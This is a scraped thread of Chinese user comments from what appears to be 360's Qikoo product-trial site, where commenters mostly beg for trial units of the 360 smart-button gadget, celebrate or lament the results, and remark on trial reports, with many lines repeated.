经常在想，孩子在幼儿园做什么？跟妈妈在哪里玩？希望与儿童卫士一起为孩子的明天努力！如果有体温监测等功能就更好了！
这名字时尚不
360儿童卫士官网
我也来测试评论下.
免费的活动，非常期待。
好的, 好的 提前恭喜你
恭喜彭镇长
恭喜有机会试用的朋友
为什么不支持ios？
我竟然中了，嘿嘿，谢谢
好期待产品的到来~~谢谢奇酷 谢谢360
很荣幸获得试用资格！刚刚收到360的短信，东西已经寄出了～收到后会第一时间给出优质测评～
先试用，再评价
话说同学给这评价都不是很好诶？！~~
审核的是眼瞎么。我那么多建议。你没看见
我，中了，，怎么办
大家的关注，注定了产品的拥挤。还是得感谢劳动人民的辛苦。希望它能快点上市~可以自己买一个用~期待！
尼玛我居然中了...我居然中了...中了...了....
审核的眼睛真是瞎了，白给你们提了那么多有用的意见了！这产品以后扔大街上都没人要！！
审核的是眼瞎么。我那么多建议。你没看见。吗的
竟然没中，亏我写了11条建议！！QAQ！！！
- -.呜呜呜 还是没等到~ 心碎
不期待了、居然没中、再也不期待了、我居然期待的每天都看好几次中没中
没有中啊~哎~~~~~~~~~~~~~
我中了，非常感谢奇酷网给我的机会！
不期待了、居然没中、再也不期待了、我居然期待的每天都看好几次中没中
没有中啊。。。。啊。。。。啊。。。。
很感谢360给我这个试用机会...
太兴奋了，中了，哈哈哈！持续关注！
不中呵呵呵
期待中……
什么时候开始销售啊！
很遗憾啊，没有中啊。。。
名单出炉了
好悲伤 木有中555
拜托 求中啊！！！！！！！！！！111
又没中啊！
好悲伤 没有中哇
555 没有中~~好悲丧~
感觉很好玩，希望我也有一个
这么多人中了，怎么就我没中啊，伤心，期待再期待
这么多人中了，怎么就我没中啊，伤心，期待再期待
试用竟然未通过！！
为何没有俺
试用竟然未通过！！
期待啊.....
期待啊.....
等好久了，希望之光能找到我吗？很期待哦。。
我来啦，试用……
拜托 求中啊！！！！！！！！！！111
现在激动的一直在刷网页，希望能得到试用的机会啊。
现在激动的一直在刷网页 希望能得到试用的机会啊
特想要！！
期待中360....
期待中....
期待中....
什么时间公布啊啊？
什么时间公布啊啊
好东西不错
期待啊~~~好像试试怎么样啊~！
期待啊~~~好像试试怎么样啊~！
期待啊~~~好像试试怎么样啊~！
期待360欧巴太贴心了，xp,wifi,智键
期待360欧巴太贴心了，xp,wifi,智键
大爱，，等待ing，，
大爱，，等待ing，，
大爱，，等待ing，，
好像要・・・・・・
好期待0.0 希望能被选到
就想等待救赎一样，期待它的出现；即使不能得到试用，也希望尽快买到一个~还是期待自己可以被选中吧~
就想等待救赎一样，期待它的出现；即使不能得到试用，也希望尽快买到一个~还是期待自己可以被选中吧~
就想等待救赎一样，期待它的出现；即使不能得到试用，也希望尽快买到一个~还是期待自己可以被选中吧~
就想等待救赎一样，期待它的出现；即使不能得到试用，也希望尽快买到一个~还是期待自己可以被选中吧~
就想等待救赎一样，期待它的出现；即使不能得到试用，也希望尽快买到一个~还是期待自己可以被选中吧~
第一次，希望可以获得，无限期待中
第一次，希望可以获得，无限期待中
期待中！！！！！！！！希望能中
期待中……希望能中
希望自己能中，关注好久了。
希望自己能中，关注好久了。
我想体验下 支持安卓4.4吗？
期待呀 不知道我的米能不能有个试试 啊
期待呀 不知道我的米能不能有个试试
期待中……
好想试试，希望有我的一份，期待中......
期待中……
非常好的设备，期待中……
早就介绍给很多朋友啦！就差实物产品了！期待啊！
期待中……
很好的东西，已分享给好友同学！希望可以获得试用机会！赞一个！
期待中....
希望可以得到一个名额，期待中....
一直想要找的东西 ，期待 ?
我是想一键拍照什么的。
希望360及产品做得更好，渴望获得使用权。酷派大神9976A
只有安卓系统能用么 我是iphone的怎么办，好好的东西，好想用下试试啊~
希望有一个GPS定位功能
实在赞，华为t8833能用吧，安卓4.0.4的
华为p6 渴求
HTC One max 8088
如果能选中我就更好了……期待ing……
期待360能 做的更好 走的更远 创意更新 追随更完美，，力顶 360 产品
很期待产品
希望可以试用
这个网站是新办的吗，之前都没听说过！！
希望可以试用
好期待。。。
这个可以有
我这360的忠实用户现在听说360发布了智键，好期待，希望智键它尽快上市。360是一个勇于挑战，打破垄断的公司。360的产品都是创新产品，从不模仿，而是被模仿，祝愿360成为最值得我们大家信赖与依靠的通讯公司。
希望有挂绳孔，这样用耳机时就不会弄丢了！！！
这就是360科技产品，精华。
应该很不错的产品，很是期待，一定会满足大家的。
360好厉害啊 背后的设计师也不错
挺不错的哦 有创意
期待。。。。。。。。。。。。
去年就在淘宝预定了一个了 用了一个月功能还行 顶你们~！！！
360发布了智键，好期待，希望智键它尽快上市。360真牛啊！呵呵！是一个勇于挑战，打破国外的垄断公司。希望360从不模仿，而是被模仿，
我来试试好用不，好用的话，努力顶
360发布了智键，好期待，希望智键它尽快上市。360是一个勇于挑战，打破垄断的公司。360的产品都是创新产品，从不模仿，而是被模仿，祝愿360有朝一日打败某好山寨的即时通讯公司。
好东西，关注好久了。希望早日上市。
我要是能有一个，做梦都会笑
活动挺好的 ，我一直都支持奇虎哦，360有前景的一个公司，加油。 杀毒免费打天下，随身WIFI开辟地，更有好多新产品，只等大家来参加！！！
效果如何？
有分不同耳机的接口标准吗？国内常用OMTP，国际常用CTIA。
我爱360智键 我永远顶你 加油加油 希望你们多创作一些好玩的东西
不是10号结束么，延期啊，别跟我抢啊。硬件方面的改动好像没看出来。
影不影响手正常接听电话
买新手机了，求送一个
这东西很实用 !360 ok!
什么时候出ios版啊。。。
希望有机会得一个试用
我要一个！支持必须！！
这个能再加上一个手机吊环吗，挂在钥匙上面会方便很多
等待真是漫长
支持360智键！
等待很久了，希望可以试用…
神器啊！！！
支持360智键！！！
期待得到试用资格！
感觉这东西很实用 不错 支持
等待真是度日如年！
期待试用中签啊！！！
真心期待啊！
好期待啊！！！
希望智键能做到让我们满意
关注好久了，终于要试用了，很给力啊
淘宝都是假的啊。这个应该才是真的。
很想试试阿
淘宝不是有卖了吗 还行不贵。。。。
平时就喜欢试用不同的软件，硬件，感受用户体验并向相应的公司提交大量的用户体验感受。所以希望也可以体验智键。
支持360产品，再早之前就想象过智键这类产品，没想到360这么快就做出来了,一定支持！！也希望自己能被选中，想体验一下自己做梦都想要的产品！！
奇酷，我最爱的网站。智键快到碗里来！！！
添加app快捷开启这个不错呀
很想要一个手环，可惜结束了
评论能回复了？
昨天被通知获得试用资格，欣喜之余想早点收到货，看看这小东西是否能给我的手机插上翅膀……
在多看看其他的东西。貌似也挺好玩。
哈哈。感觉这个东西还是更适合年轻人用啊。
其实还是为了操作方便 这跟唤醒的软件是两回事吧..
还行吧，毕竟不能设计的太突出，妨碍到手机的正常试用就不好了，不过可以考虑加根细线方便拔出。
5.（二）提的问题没法解决吧 照你说的不戴手机套的就没法用了
太棒了！！！你的试用反馈已经在智键论坛帖出啦~ 欢迎继续反馈哟！
感谢亲的反馈哦，如果还有什么问题和建议，欢迎多多吐槽。
给试用报告赞一个~写的很认真哦。 智键君感谢亲提出的建议啦~
怎么就是申请不上啊
试用报告提交后没有反应呢
试用报告提交后没有反应呢
第三次申请，希望这次一定要通过啊
用盖世的大户啊！！
手感指的是？
pengzhen你的娃咋样了?
只有APP的图呀。有智键的图么
卡片的质感好像有变化
怎么没有图啊。没有更新上去？
哈哈  搬个板凳看直播~~话说LZ你家植物好多~
这个是不是能成为***神器啊。
自 拍神器。
pengzhen还钱！
希望选到pengzhen啊
神钉。。。哈哈
沙发 沙发 傻瓜
什么时候能在iphone上用啊。很期待。
好像是个妈妈啊。怎么自己戴上了？哈哈
这个绝对是我看的报告里最真诚的啊。要赞一下。
今天抽空来看了下  东西确实不错, 希望能快点出真东西
期待手环能售卖。
哇哦 这么多人关注了
有一点像moto那款
很漂亮的手表。
哇 这个给男票买个当生日礼物是不是很赞~
可以人神不知的干一些事情,男人都懂的。。。。
不过本人在使用当中估计也得按了有百次左右了.准确率达到百分之百。这么好用吗？这么夸张。
希望不要太大，手腕比较小
90后父亲~~哇哦 报告很精彩
“智键君”怎么听着像日本人的名字呢！！
为嘛看到这么多选中的，就是我没啊
这个原因家长也能戴呀..
很不错，希望能让我试用下
就是外形 能不能突破一些？赶脚像索尼的风格
是2998啊
2999.。。。。
好东西啊。
真希望来和我的小米盒子还有天猫比比
不错不错、
我已经关注很久了 希望可以得到试用资格 非常期待 恳求让我试用
好东东啊什么时候开始试用呢
什么时候可以试用呢 很期待啊！！
外形看起来很不错。
什么时候可以试用呢 很期待啊！！
很想拥有他
有了它，就可以不用电视机顶盒了，期待！
很想用用各种盒子。
好多盒子啊。
呵呵，听起来很友爱的！期待！
可以增加报警功能，当心率异常或者心脏停止跳动时发出预警等等
这个智能手表好黑啊。
真心不错，如果可以增加运动监测功能就更好了
不错真的不错
好好啊，作者候能试用啊？
貌似不好看
这像他们说的一样吗
有意思，期待他
有意思,很希待
这也太酷了吧
好玩真是智能时代到来了
好玩真是智能时代到来了。
好玩真是智能时代到来了。
这么小巧的玩具，超Q啊~~
期待啊，希望获得试用啊
老牛X了 很喜欢
这个好 呵呵，好期待
支持，挺赞啊！
期待，期待期待，支持


好


testtest
果然是没有做不到，只有想不到啊！！！！！我想体验！！！！！！！！！！
我也想试试
创意无限 支持新奇酷
好东西，创意无限啊。
希望可以得到这个智键，因为我也喜欢新奇酷
淘宝不是有卖了吗 还行不贵。。。。
好像得到啊！！我是达人，喜欢折腾！
这是什么看不懂啊
我也想得到他啊，可是每次这种活动都是失败，希望成功吧，小编加油
太好了，希望可以得到它！
好想要，一定要选中
看起来很不错的功能啊，期待试用
好东西，大家一起来关注，赞！
好像得到她啊！！我是达人，喜欢折腾！
还能说神马呢 快到我手机耳机孔里来
1231231231asd
我来关注下, 看看怎样
希望可以得到它
好东西！求试用
好像得到她啊！！我是达人，喜欢折腾！
希望可以得到它
好希望能够得到它啊
非常希望能够收到啊！
这试用必须给我
哇塞好棒好神奇第一次来这里会继续关注哒
非常期待这样好的产品
非常希望求试用
我也想要一个试用，
淘宝不是有卖了吗 又不贵。。。。
看来这神器能解决我的部分烦恼吧！！！给个试用就爽了
期待 智键 智能生活
双击点亮屏幕，三击关闭屏幕
求试用很棒哈哈哈哈哈哈哈哈哈哈哈哈哈
很棒的东西 求试用
期待期待期待
智键，一键开启你的技术手机生活，求试用啊~~~~~~~@360智键@qikoo奇酷网
看起来很棒哈・・・
第一期就没有使用上
求试用...
求试用...
可以唤醒吗？？？？、希望亮屏不用老按电源键了。。。。。。。
好有意思的说
永远支持中……
360越来越让人惊喜了
看起来很棒哈・・・・
稀奇古怪高级
在这个键上增加指纹识别功能。O(∩_∩)O哈哈~
我好想要 支持 这样的好产品 希望360可以多多的成产此类产品
我从来就没中过什么奖，希望这次可以出现奇迹！唉~
求试用，求中奖
智能硬件开启新时代，期待哦！
我喜欢你安智我真想拥有你
我很期待着能试用
支持好产品
期待哦～～～～
期待试用啊
等着瞧吧，360这才是创新，只要有需求，他就会开发，也会越来越强大，支持！
不错不错，已经 提交，希望可以尝到新品
期待试用啊！
期待好产品，支持360！
期待期待~
期待试用啊！
360加油，支持你一直都这样免费，打倒腾讯百度。老百姓技能你们！
希望尽快支持ios
万分期待这个神一样存在的产品
期待着试用
支持360做出更好的产品，比某米的饥饿营销好多了，赞一个。ps:希望能有试用的资格，我会做好反馈的。
真心期待这款好产品，支持360！！！！！！
申请，期待着!
智键，我能试用吗？我的note3需要你啊！
永远支持360！！！
期待ING 。。
静心期待试用！！！
我一直有个愿望，那就是做一个360的忠实用户，360是以永远在硬件软件上的胜者，我好喜欢这个360智键，它满足了我对手机的要求，期待我有机会见证360的成功，谢谢。我永远支持你，我最信任的“360”
试用过wifi2代，不知道这次有没有？已申请！期待试用！
已申请 ，期待试用~~~~~~~~
期待能够试用
企盼这极具人性化的万能键如愿到来。
已申请，期待中
好东西一起分享，独乐乐不如众乐乐。
希望能获得试用资格
我申请了，很期待收到试用品，看看到底是怎样的一种产品？？一直在淘宝试用中心申请试用品，并成为资深试用评论员！
主打"安全"！适用所有手机，主要装上这个"智键"，斯洛等这些美国特工就无法监听手机通话和短消息！！！
支持有更多创新的产品
一键锁屏，有木有
也来评论。希望能获得试用吧。
用360已经很多年 不错的软件 和不错的硬件！
求好运求好运求好运求好运
老周又要准备颠覆了
好东西一起分享，独乐乐不如众乐乐。
大力支持360
大神们您们辛苦了！！真是太棒了，太了不起了，太有创易了！！！太贴近生活了，有了你们的存在，生活不在孤单，世界充满了爱！！！！！！！！！！！！！！
进入触摸时代后，人们又怀念按键。智键只会是个新奇的东西，不会是主流，因为手机只要改动下就能达到智键的功能，而且智键占用了唯一的耳机接口。不过360这几年确实做的太棒了，支持一下！
360永远是最棒的.支持360
360永远支持。
中国有N多公司养着一帮有点关系或有点姿色 的废物。危机来了除了张嘴骂，想方设法各种诋毁。就没点能针对问题解决问题的能力。跟个婊子是的~有时想想贴切的形容真的很可笑。有本事拼技术啊！难道百度和金山等拉帮结派平日称兄道弟 分赃明确的所谓的战友们到了关键时刻都把脑袋放地上了？拿到你们和你们的员工都属狗的？危机来了只会叫唤没有攻击力？互联网信息时代，用户需要及时发现问题能力，但更需要解决问题能力！金山懂吗
这个世界需要的是创意，是品牌的世界。这类战场跟一线城市尤其是北京一样，有能力的人没机会，没能力的人混日子。面试官发现求职者能力大于他，面试官选择直接否掉，每月新注册的公司300多家倒闭当然也是正比。天天大嗓门喊招人才，天天招不到。也不想想什么原因。领导都没有实际的人才理念，下属怎么可能真心实意的吸纳人才？周鸿
没一份你们的付出 都是我们体验者的用心
360永远第一
360随身wifi最神奇的产品 这次的智键更神器！！
用360已经很多年 不错的软件 和不错的硬件！
永远的支持
不错的产品
360最棒支持360
支持360,360永远是最棒的！！
希望360再接再厉
好东西当然要大家分享啦，加油！！！！！支持你！！！！！！！！！！！！！！！
加油，你会更棒的
绝对支持呀！哈哈哈！
作为360的资深用户，希望能做的更好。加油加油
大爱360！
喜欢 期待 骄傲 加油
支持，绝对的支出
期待中，很有创意
能给我一个不？
希望设计的合理一些，减少误操作，毕竟是个凸起的东西。
支持~360一直在用
看上去超级前卫，快开发出来，买一个也行。
感觉挺好用的样子@-@
很好！360随身wifi2很好用，现在又出新产品，很好呀，我想试试。感谢！
很好的产品，很酷的创意，希望能试用入选，好认真体验这一款酷品。
好产品当然支持
360支持必须的！
锋芒网手机业余评测师，期待可以试用到这款智键
我一直都很支持360
希望360继续给力。支持你
造型很新奇，虽然是个防尘塞，但却是智能防尘塞，很想用看看试试
必须顶你。
从360WIFI开始给我新奇的视角看电子产品，真心希望快点入手
嘿嘿！！！
这个产品太给力啦！！！
真心不错，希望360能推出更多为民服务的产品
好产品支持
360又一创新产品，支持！
chulai ya
好想用啊！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！！
360越来越多的带给我们惊喜,希望试试这个！
又一款好产品
有限的负出，无限的关注，360看好你
一直在用360的产品，能给个机会不？？
参加过各种数码产品产品，希望试试这个！
我一直用着360的产品，无论是软件还是硬件。360产品通人性，我超喜欢。
360你是我的最爱
不知道支不支持n821
请问，只要是智能手机都能用吗，外屏坏了，也可以用万能键使用吗
手机用的是NEXUS5 哈哈 我也在用这个手机喔
360奇酷频道尽为人们创造好东东,从卫士\网页\杀毒等待,真是好处多多,无法形容无法说,愿360步步为赢,前途似锦,永攀高峰.
360越来越多的带给我们惊喜与超越，希望以后能够加入它并且为此而努力奉献！
看到奇虎360s讲的心一下子就澎湃！！
360首批用户 目前360随身wifi还是一代 表示期待
什么时候出苹果IOS系统能用的？能不能也像安卓系统的一键录音功能？
什么时候出IOS系统的
大家不用担心抢不到的问题 现在 是试用 不是限购 将来会发售的 据可靠消息称 360正在努力缩减成本 完善产品 预计 发售价格10元
好期待。求试用。
感觉还不错。360我已经用了几年了。最近也不知道是怎么了，金山老是和它作对。因为我用360时间比较长所以我还是比较信任360。
用不用还的
希望360将来做的会更好、超越国际领先全球不再是个梦
希望360智键名副其实，简单实用
试用么？创意不错求体验……
好神奇的钉子呀
360！看好你……
创意无限，非常期待，真的不错
什么价位，直接买一个算了，不用试用
看起来挺方便的，真心希望我能拿到体验资格啊，真心的
估计又是一场空----------
听名字挺好的，试试才能见真章！
期待ing
看起来很不错啊，真心希望得到使用体验资格~
科技如此发达，生活因此而美好！
看起来很不错，真心希望得到使用体验资格希望通过，会认证写报告
这个东西应该不是什么高科技吧，软件好就行了。
还忘记了一点！这个产品难道不需要电源么？？？还是插到耳塞孔里直接消耗手机的电量？？？
有创意的设计，简洁 易用期待实际体验。
很是期待这种新奇产品！就是不知道上手后的感觉怎么样！反应速度，耐磨损度，还有就是不知道手机装上“智键”后装在口袋里面会不会发生误操作！
一直以来都支持360，希望体验试用资格
想要一个使用.我是学生.会认真的写实验报告的.
给32个
能到智键，让这里更多的人们能领略到科技的进步。相信他们会惊讶地叫起来。“哪儿买的”
看着很好！
看起来很不错啊，真心希望得到使用体验资格~~
希望通过，会认证写报告，充分发挥我的想象力，想个完美的结合的。
自能就是让人带来方便，只有想不到，没有做不到！
同求体验资格，平时手机想用某个软件，得频繁解锁，这种产品出现解决了这个问题
能拥有才是王道，别搞得跟小米一样就好，东西再好，能买到手才行
能到智键，让这里更多的人们能领略到科技的进步。相信他们会惊讶地叫起来。“哪儿买的”
希望能得到试用体验资格啊~~~~~~
很好啊，用起来一定很方便的，希望可以试用。
求体验资格
360让美好时刻永在
我噻，智能距离我们越来越近了，继续体验，给个资格吧，呵呵
我也想体验一下，不知道有木有机会的说
渴望能到智键，让这里更多的人们能领略到科技的进步。相信他们会惊讶地叫起来。“哪儿买的”
求体验资格
挺好的、、、、、
从360安全卫士认训360产品，本人报着找问题、挑毛病的心理来试用，希望360的产品越做越好。
360越来越给力 求给个体验资格
可以替代HOME键。不知道可不可以替代电源键呢。电源键坏掉了。。。。锁屏可以用一键锁屏，可是开机就麻烦大了。。。求试用，求尝试
支持360，求圣器
想体验一下
方便携带，我最喜欢特别酷而且智能化的产品，奇酷经常有国内外最新的智能设备以及最详细的产品介绍，我喜欢！好评！
必须要支持下 非常期待。
加油你，，，，，，，，，
喜欢360 关注好久了
强烈支持360
这坑爹的设计是谁想出来的，居然占用了手机唯一的耳机插孔；是是是，还能防尘呢！
力挺360
期待中……
我一直以来都在使用360的各种姑娘和产品，我信赖360和奇虎360的各种产品和功能
非常期待！
这个真不错
方便携带，我最喜欢特别酷而且智能化的产品，奇酷经常有国内外最新的智能设备以及最详细的产品介绍，我喜欢！好评！强烈支持奇虎360，呵呵.盼望神器到来，大力支持360.我已申请试用。
中啊。。。。。。申请任何东西就没中过一次。。。。。求中。。。
360越来越给力了！！！
360做的产品越来越有创意了，支持
喜欢360硬件产品！期待智键的推出！
真的是V587啊
哇，这个可真是好东西，非常期待360 V5
大力支持360
支持360 求给个体验资格
一直支持360的产品，比如360随身wifi就很好用，好想要这个360智键啊~期待试用。
强烈支持奇虎360，呵呵
非常值得期待
方便携带，我最喜欢特别酷而且智能化的产品，奇酷经常有国内外最新的智能设备以及最详细的产品介绍，我喜欢！好评！
360威武
介绍得不错，赶快体验一下。期待中！
盼望神器到来，大力支持360.我已申请试用。
盼望神器到来支持360
永远支持360！！
方便，小巧，功能多。支持360
选择360是一种信赖 一直在关注360任何产品 目前已购360随身2 希望360能给我们带来更好更多的乐趣
安全好卫士，生活好帮手，就在360
非常非常希望啊
支持360，一如既往
家里全部电脑都有360随身wifi，支持360！
360,365天精心呵护您，
支持,期待试用.
小巧，便捷，值得期待
选择360是一种信赖 一直在关注360任何产品 目前已购360随身2 希望360能给我们带来更好更多的乐趣
我需要呀 支持360 我是第一百个
支持360必须的 国内的骄傲。
好期待，很喜欢360的产品，以前没有抢到，希望这次能中奖。
期待啊 期待
永远支持360！！
顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶顶
期待啊！我买过13个360随身wifi2就期待这个了！呵呵
盼望神器到来，大力支持360.我已申请试用，祝自己好运！！！
一切皆有可能，又有点不可思议，期待着。
支持360，这是一个真正为用户着想的企业！
我喜欢，好棒的设计
很创新的发明，想想有点小激动哦！
希望试用，是否期待
看着蛮不错的 就是不知道实际怎么样。。
大家加油啊
一直都十分喜欢360滴产品。。。(*^__^*) 嘻嘻……
支持360很久了，现在使用的不少产品都是360的，挺人性化的。
我很需要这个，希望能抽中嘛！嘻嘻
太刺激啦~~~今天看到这么多创意产品很期待，很喜欢，已经买过360WIFI啦~~~很喜欢~~~好期待啊~~~
十分期待，永远支持360.
很期待 顶顶顶顶顶顶
真心好奇这个神奇的智能键的工作原理
东西小功能大，真的拥有！送我一个呗！
支持360的一切。
已申请 求给力。支持360
火速期待试用。
期待啊 期待
跪求试用！喜欢！
很期待，有它妈妈在也不用担心我笨啦
我也要领跑潮流嘛，拜托已经申请希望能试用哦
小编大大，给我个体验的机会吧！一如既往支持360好些年了！忠实粉丝！
分享给群友了，新奇特，求体验
想拥有。。呵呵
申请完毕，坐等奇迹
你要送我一个，我就在用用安卓的手机
跪求试用！喜欢！
老子明天不上班也申请了，看能不能给老子邮来。
期待这个产品
这么好的东东，急切期待它的功能试用，加油。
360很不错的，我用的360浏览器，安全卫士。杀毒。刚才有订购了360随身WiFi 2（设置超简单，超便捷的无线路由器） 阿狸限量版阿狸Ali 8周年珍藏版，全球限量发行！支持360！！
人懒，解决问题，方便用户。创作之精巧，非常想体验。已申请，求感触！
等啊等，等内测资格
好奇！！！！
很希望得这这个宝贝 给使用手机的生活中增添便携、愉快地心情
哇，有这么多功能，好东东
不知道实际使用中，是否真的快捷方便。
跪求试用，喜欢新玩意儿。有创意有想法。
我已提交申请，并且分享到微博，请早日发货，谢谢！
我也申请了，刚看了功能很强大，非常想尝试尝试，支持360
360的产品我一直很喜欢，这个产品值得期待！
已经申请了，很给力，希望可以得到内测的机会，感谢奇酷和360！！！
已申请求通过 好想要啊。。
期待申请成功、对这个智键很感兴趣、支持奇酷和360！期望成功内测！！！
已提交申请，希望能有一台可以试试，360加油，越办越好
我已提交申请，后台给力啊，如果我收到货之后，会写出详尽的使用报告
好东西，好期待，支持360！！！
我是360的忠实拥趸，每天在电脑和手机上都在使用360产品，我也是第一批购买360WiFi的用户。继360WiFi和儿童手环之后的又一力作，我非常愿意试用智键，开启360更多的奥秘。
期待申请成功,中国需要这样的创新企业,希望360能走出不一样的路,打败山寨大王
360就是有创意
期待是性感的，等待是苦闷的！
很酷的产品，拿出来肯定拉风，高科技，希望审核成功！
已经申请了，很给力，希望可以得到内测的机会，感谢奇酷和360！！！
东西不错 好奇、
一直信赖360，支持360，期待能带给我们更多惊喜。
我已提交申请，后台给力啊，如果我收到货之后，会写出详尽的使用报告
新东西 ，好期待 ，可是这样子以后想听歌 还拿取下来在插耳机？
期待申请成功、对这个智键很感兴趣、支持
期待中。。。
360总是快人一步，我会一直支持的，希望不会让我们众多用户失望。加油！
看了介绍，挺新奇的，科技让生活更方便。
我很好奇，期望能有这个功能
期待申请成功
很期待能申请成功
新东西当然要用用
很酷的产品，拿出来肯定拉风，高科技，希望审核成功！
好东西，值得推广！！
期待期待啊，耳机插孔能够扩展使用，好厉害啊
好期待到底是什么神奇的功能
东西很好，就是希望不要影响平时手机正常使用，出现了BUG要及时处理....
期待ing
很给力的一个小塞子！
很期待，真的
技术与艺术的完美结合
wow期待申请成功
俺的运气一向是很好的，前几天还中过奖，就看这次的人品怎么样了
听着就很酷，希望申请能通过。
很喜欢这款硬件，对记者有很大的帮助，希望可以获得试用！
挺好的一款智能按键。很期待哦。
科技改变生活啊
怎么申请？
不错，支持~~~
我对这个智键很感兴趣，希望能得到！
如果能加入指纹扫描功能就完美了~
不让参加试用申请了吗？提交申请时老提示“姓名不能为空”，能不填写姓名吗？系统咋回事！
好神奇啊，好想试试
能作为wifi信号增强器么 能作为wifi信号发射器么
智能硬件要开始火爆了啊。
支持、顶。
听着就很酷，希望申请能通过。
创新是制胜的法宝,很期待360创造奇迹!
果断填写安卓系统。
还不错，已经申请，不知道能不能幸运获得。
昵称不能为空
ios系统用户有中奖概率吗 其实俺有安卓手机的。。。。。。。。。。。。。。。
WO YE YAO
期待中，不要 让粉丝们后悔哦
就看谁是幸运的孩子了
~~~~~~~~~~~~~~~
前排支持一下
我想要，好神奇的东西
非常期待拥有, 能去切身体验下, 提一些建议.
10号就是我的生日了，期待申请通过，谢谢你们，就当是我的生日礼物吧。
哇，智键终于要出来啦，求第一时间试用，不知道app何时才能下载，想先体验一下
期待申请通过你
好东西, 赶紧来申请!
什么时候出名单？
如今世道不容易，要想中奖靠运气，铁杆360会员，求发奖品鼓鼓励！
科技改变生活
我希望以后，所有东西，都能智能化管理！360加油！
很期待啊，现在赚钱困难，希望拿个方便下老人家！
期待好运？！会来吗？
哇，科技改变生活啊，要是能关水龙头就好了
我多想有这么一个家庭的管理中心呀！
估计会比较复杂。不是很简单就能玩转的。
看起来很挺高端 不知道用着复杂不
不知道会不会像想象中那样好用啊？！
上次没RP，这次照样期待！！！
感觉好帅气的样子 不知道实际用起来会不会很麻烦
好运？！会来吗？
不期待了、居然没中、再也不期待了、我居然期待的每天都看好几次中没中………………
111ffg
我很期待360出更多的好产品
非常期待能够试用上。
介意给我一个吗？如果不那就快点给我邮寄过来。
期待啊。。。
看样子具有未来感
爱上你就要定你一生一世跟着你
这么厉害啊，不错
这么吊啊，不错
这么吊啊！
我都申请了EN次了，这回神奇轮也该轮到我了吧！！！呵呵
我都申请了EN次了，这回神奇轮也该轮到我了吧！！！呵呵
我都申请了EN次了，这回神奇轮也该轮到我了吧！！！呵呵
期待中。。。。。。。。。
好期待这个神奇的东西，能抽中的话我就可以体验只能家庭生活了。作为新婚礼物抽中我吧，嘿嘿
好期待这个神奇的东西，能抽中的话我就可以体验只能家庭生活了 作为新婚礼物抽中我吧 嘿嘿
好期待这个神奇的东西，能抽中的话我就可以体验只能家庭生活了 作为新婚礼物抽中我吧 嘿嘿
好期待这个神奇的东西，能抽中的话我就可以体验只能家庭生活了 作为新婚礼物抽中我吧 嘿嘿
某项答案不合法是什么意思
某项答案不合法是什么意思。。。。
万能遥控器，还是智能型的！！！！！！
万能遥控器，还是智能型的，这个可以有。
不错哦 科技改变生活 终于可以实现了
不错哦 科技改变生活 终于可以实现了
我好想要啊
支持360，期待更多产品
支持360，期待更多产品
支持360，期待更多产品
360真给力
360真给力
360真给力！！！
让我体验一下吧，好期待啊！！！
让我体验一下吧，好期待啊！！！
期待自己能中呀，快到碗里来。。。
期待中。。。。。。
期待 但愿我能抽到
期待...............
期待...............
这个小产品太智能化啦，给力。
求抽中啊... z
求抽中啊...
期待着新产品的到来！！！
期待啊。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。。
支不支持蓝牙哇
想亲身体验智能家庭遥控，与大家分享体验。
求抽中啊...
这个东西应该不用充电。需要插电源的吧。
天天看奇酷
好用会全力推广
我太喜欢充满高科技感的东西，如果有了这个，就可以让我们一直向往的生活变得智能化，可以远程控制家庭的东西，如果颜色可以有更多的选择就好了，这个要充电使用吗？希望我能抽中！
好想体验一下
要天天看奇酷
很渴望拥有，感觉这是一款非常不错的高科技产品
好酷的一款产品 期待试用！
家里的电器用起来不太方便 申请试用...
自己想买个
生活有你更精彩。
很好 就是造型有点不太好看
开启申请了。期待啊。科技感。
这东西帅气啊，真的有设计师设计的这么霸气的玩意？ 我要抽中一个
我要申请试用，请问从哪填申请表？
接近全智能的高科技商品本来就是生活的主导！E遥控一定可以获得很大的成功！生活会因为你更精彩！
这个东西很有用，我得仔细研究一下
这东西能DIY智能家居啊，太牛了，使用一个先！
哦很想要一个哦・~~申请申请・・・・希望能通过哦・・・
神器！必须申请试用
家里有客人时，我用手机一点，电视，空调，机顶盒立即打开。那得有多酷啊~简直就是奇酷啊！！！
好期待啊,(*^__^*) 嘻嘻
饿呢，我要申请！！
不想在打酱油了……
赞！现在每天都来奇酷逛逛看有什么好东西，希望这次中签
这款产品能买了吗？看起来很棒啊！
像一个飞碟的样子。
好东西，产品介绍再多点就好了，求试用！
哇，好神奇的东东，迫不及待了！
这个看起来好酷呀 感觉要是路由器做成这样子我肯定买一个！！
奇酷又出好东西了啊。赞。期待
这个东西很赞啊。支持一下。希望能中奖。
这个看起来好酷~希望尽快参加哈
期待期待！
活动25号才开始吗？
想要一个手环
好啊 you will 
好啊 you will 
好啊 you will 
好啊 you will 
同喜 同喜 
恭喜今天大家都中奖!
什么时候出名单  本期试用结束 整理完 就会出了
我不中  妖 
应用界面很不错啊。感觉好想买一个啊。
反应真的很快吗？真想自己试试。之前用过快按钮，反应就感觉比较迟缓。不是很灵敏。
がんばる 360
我发现你的思路和建议都非常好。我也有这样的困惑。如果坏人把手环给扔了怎么办。是不是应该有隐藏的必杀功能。
反应还可以，我上一张中午出去买饭随便按的效果图，当时设置的是闪拍米哦是，人还在走路，一会你看下帖子的更新
昨天收到短信，我中了哦！！
整体来说确实不错挺好用的，但是小瑕疵还是挺多的
其实什么东西都是双刃剑，有弊有利，智能化虽然我们拍手叫好，但是父母对于使用可能会很难理解，所以求一台能提前教父母熟悉，以适应这个智能化大势的时代
还有一点刚想起来，就是双击呼出操作界面时候延迟会有点长，不是马上能出来，不知道是设定就这样还是反应就是慢
录音效果很好
插拔都容易吗？不会***去就拿不出来了吧。
然后还过滤了敏感词。。。
科技改变生活。好想试试啊。
拍照很方便呀 哈哈
图片呢  请楼长更新下呗~
恭喜恭喜啊。
这报告的图片还得歪着头看啊。哈哈
感觉一些想法都能成为现实。得多多提建议啊。
什么什么智键君，智键妞那个卡片也是送的吗？
我的还在路上还没到家呢 
是的 很神气
期待......
第一次发布使用报告  ,希望大家多多海涵
出的好快啊 支持一下
